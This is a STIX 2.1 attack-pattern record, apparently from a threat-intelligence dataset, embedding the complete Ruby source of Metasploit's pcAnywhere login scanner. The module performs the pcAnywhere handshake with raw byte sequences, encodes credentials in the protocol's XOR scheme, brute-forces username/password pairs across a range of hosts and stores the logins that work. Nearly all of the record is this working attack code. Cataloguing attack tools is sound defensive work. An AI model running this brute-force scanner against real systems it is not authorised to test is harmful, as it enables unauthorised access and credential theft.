{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--2655ecff-6937-467d-aeee-c853015eebcd",
    "created": "2024-08-14T16:26:37.404568Z",
    "modified": "2024-08-14T16:26:37.404572Z",
    "name": "PcAnywhere Login Scanner",
    "description": " This module will test pcAnywhere logins on a range of machines and report successful logins. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/scanner/pcanywhere/pcanywhere_login.rb",
            "external_id": "pcanywhere_login.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "1999-0502#Weakpassword"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\n\nclass MetasploitModule < Msf::Auxiliary\n  include Exploit::Remote::Tcp\n  include Msf::Auxiliary::Scanner\n  include Msf::Auxiliary::Report\n  include Msf::Auxiliary::AuthBrute\n\n\n  def initialize\n    super(\n      'Name'        => 'PcAnywhere Login Scanner',\n      'Description' => %q{\n        This module will test pcAnywhere logins on a range of machines and\n        report successful logins.\n      },\n      'Author'      => ['theLightCosine'],\n      'References'  =>\n        [\n          [ 'CVE', '1999-0502'] # Weak password\n        ],\n      'License'     => MSF_LICENSE\n    )\n\n    register_options([Opt::RPORT(5631)])\n\n  end\n\n  def run_host(ip)\n    connect\n    hsr = pca_handshake(ip)\n    return if hsr == :handshake_failed\n\n    each_user_pass do |user, pass|\n      next if user.blank? or pass.blank?\n      print_status(\"Trying #{user}:#{pass}\")\n      result = do_login(user, pass)\n      case result\n      when :success\n        print_good(\"#{ip}:#{rport} Login Successful #{user}:#{pass}\")\n        report_cred(\n          ip: rhost,\n          port: datastore['RPORT'],\n          service_name: 'pcanywhere',\n          user: user,\n          password: pass\n        )\n        return if datastore['STOP_ON_SUCCESS']\n        print_status('Waiting to Re-Negotiate Connection (this may take a minute)...')\n        select(nil, nil, nil, 40)\n        connect\n        hsr = pca_handshake(ip)\n        return if hsr == :handshake_failed\n      when :fail\n        print_status(\"#{ip}:#{rport} Login Failure #{user}:#{pass}\")\n      when :reset\n        print_status(\"#{ip}:#{rport} Login Failure #{user}:#{pass}\")\n        print_status('Connection reset attempting to reconnect in 1 second')\n        select(nil, nil, nil, 1)\n        connect\n        hsr = pca_handshake(ip)\n        return if hsr == :handshake_failed\n      end\n    end\n\n  end\n\n  def report_cred(opts)\n    service_data = {\n      address: opts[:ip],\n      port: opts[:port],\n      service_name: opts[:service_name],\n      protocol: 'tcp',\n      workspace_id: myworkspace_id\n    }\n\n    credential_data = {\n      origin_type: :service,\n      module_fullname: fullname,\n      username: opts[:user],\n      private_data: opts[:password],\n      private_type: :password\n    }.merge(service_data)\n\n    login_data = {\n      core: create_credential(credential_data),\n      last_attempted_at: DateTime.now,\n      status: Metasploit::Model::Login::Status::SUCCESSFUL\n    }.merge(service_data)\n\n    create_credential_login(login_data)\n  end\n\n  def do_login(user, pass, nsock=self.sock)\n    # Check if we are already at a logon prompt\n    res = nsock.get_once(-1,5)\n    euser = encryption_header(encrypt(user))\n    nsock.put(euser)\n    res = nsock.get_once(-1,5)\n\n    # See if this knocked a login prompt loose\n    if pca_at_login?(res)\n      nsock.put(euser)\n      res = nsock.get_once(-1,5)\n    end\n\n    # Check if we are now at the password prompt\n    unless res and res.include? 'Enter password'\n      print_error(\"Problem Sending Login: #{res.inspect}\")\n      return :abort\n    end\n\n    epass = encryption_header(encrypt(pass))\n    nsock.put(epass)\n    res = nsock.get_once(-1,20)\n    if res.include? 'Login unsuccessful'\n      disconnect()\n      return :reset\n    elsif res.include? 'Invalid login'\n      return :fail\n    else\n      disconnect()\n      return :success\n    end\n  end\n\n  def pca_handshake(ip, nsock=self.sock)\n    print_status('Handshaking with the pcAnywhere service')\n    nsock.put(\"\\x00\\x00\\x00\\x00\")\n    res = nsock.get_once(-1,5)\n    unless res and res.include? 'Please press <Enter>'\n      print_error(\"Handshake(1) failed on Host #{ip} aborting. Error: #{res.inspect}\")\n      return :handshake_failed\n    end\n\n    nsock.put(\"\\x6F\\x06\\xff\")\n    res = nsock.get_once(-1,5)\n    unless res and res.include? \"\\x78\\x02\\x1b\\x61\"\n      print_error(\"Handshake(2) failed on Host #{ip} aborting. Error: #{res.inspect}\")\n      return :handshake_failed\n    end\n\n    nsock.put(\"\\x6f\\x61\\x00\\x09\\x00\\xfe\\x00\\x00\\xff\\xff\\x00\\x00\\x00\\x00\")\n    res = nsock.get_once(-1,5)\n    unless res and res == \"\\x1b\\x62\\x00\\x02\\x00\\x00\\x00\"\n      print_error(\"Handshake(3) failed on Host #{ip} aborting. Error: #{res.inspect}\")\n      return :handshake_failed\n    end\n\n    nsock.put(\"\\x6f\\x62\\x01\\x02\\x00\\x00\\x00\")\n    res = nsock.get_once(-1,5)\n    unless res and res.include? \"\\x00\\x7D\\x08\"\n      print_error(\"Handshake(4) failed on Host #{ip} aborting. Error: #{res.inspect}\")\n      return :handshake_failed\n    end\n\n    res = nsock.get_once(-1,5) unless pca_at_login?(res)\n    unless pca_at_login?(res)\n      print_error(\"Handshake(5) failed on Host #{ip} aborting. Error: #{res.inspect}\")\n      return :handshake_failed\n    end\n  end\n\n  def pca_at_login?(res)\n    return true if res and (res.include? 'Enter login name' or res.include? 'Enter user name' )\n    return false\n  end\n\n  def encrypt(data)\n    return '' if data.nil? or data.empty?\n    return '' unless data.kind_of? String\n    encrypted = ''\n    encrypted << ( data.unpack('C')[0] ^ 0xab )\n    data.bytes.each_with_index do |byte, idx|\n      next if idx == 0\n      encrypted << ( encrypted[(idx - 1),1].unpack('C')[0] ^ byte ^ (idx - 1) )\n    end\n    return encrypted\n  end\n\n  def encryption_header(data)\n    header = [6,data.size].pack('CC')\n    header << data\n    return header\n  end\nend\n"
}